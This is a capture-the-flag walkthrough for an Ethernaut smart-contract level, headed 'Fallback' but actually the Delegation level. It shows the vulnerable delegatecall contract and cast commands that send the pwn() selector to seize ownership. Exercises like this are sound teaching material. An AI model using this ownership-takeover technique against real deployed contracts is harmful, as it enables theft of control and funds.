## Fallback Level Outline

**Difficulty : 4/10**

The goal of this level is for you to claim ownership of the instance you are given.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)

## Solution

We can **spoof** the delegate call by sending a transation that contains the function signature to the "pwn()" function.

### Walkthrough

1. getting the methodId for the pwn() function
```console
cast calldata "pwn()"
```
output
```console
0xdd365b8b
```
2. making a call to the fallback function where `msg.data` equals the calcualted methodId
```console
cast send $LEVEL_ADDRESS 0xdd365b8b --gas 50000 --private-key $PRIVATE_KEY 
```
> we need to set a custom gas limit for this transaction as the default amount insufficient

## Further Reading
[video on Delegatecall](https://www.youtube.com/watch?v=uawCDnxFJ-0&t=208s)

[More info about methodId](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html)

